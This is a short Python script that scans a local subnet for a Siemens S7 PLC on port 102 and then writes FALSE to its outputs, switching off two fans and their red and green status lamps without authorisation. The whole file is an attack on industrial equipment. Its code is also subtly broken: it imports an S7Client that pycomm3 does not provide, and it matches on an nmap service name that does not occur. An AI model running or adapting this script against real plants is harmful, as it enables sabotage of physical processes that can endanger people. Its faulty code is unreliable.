import nmap
from pycomm3 import LogixDriver, S7Client
import time

# Function to find the PLC's IP address
def find_plc_ip():
    nm = nmap.PortScanner()
    nm.scan('192.168.1.0/24', arguments='-p 102')  # Adjust the IP range and port as needed
    for host in nm.all_hosts():
        if 'tcp' in nm[host] and 102 in nm[host]['tcp']:
            if nm[host]['tcp'][102]['name'] == 's7-1200':
                return host
    return None

# Function to manipulate the I/O image
def manipulate_io_image(plc_ip):
    try:
        with S7Client(plc_ip) as plc:
            # Example: Override the status of Fan_A to FALSE
            plc.write_area(0x81, 0, 0, [False])  # %Q0.0 (Fan_A)
            
            # Example: Override the status of Fan_B to FALSE
            plc.write_area(0x81, 0, 1, [False])  # %Q0.1 (Fan_B)
            
            # Example: Override the status of Fan_A_Red to FALSE
            plc.write_area(0x81, 0, 4, [False])  # %Q0.4 (Fan_A_Red)
            
            # Example: Override the status of Fan_A_Green to FALSE
            plc.write_area(0x81, 0, 5, [False])  # %Q0.5 (Fan_A_Green)
            
            # Example: Override the status of Fan_B_Red to FALSE
            plc.write_area(0x81, 0, 2, [False])  # %Q0.2 (Fan_B_Red)
            
            # Example: Override the status of Fan_B_Green to FALSE
            plc.write_area(0x81, 0, 3, [False])  # %Q0.3 (Fan_B_Green)
            
            print("I/O image manipulated successfully.")
    except Exception as e:
        print(f"Error manipulating I/O image: {e}")

# Main function
def main():
    plc_ip = find_plc_ip()
    if plc_ip:
        print(f"PLC found at IP address: {plc_ip}")
        manipulate_io_image(plc_ip)
    else:
        print("PLC not found on the network.")

if __name__ == "__main__":
    main()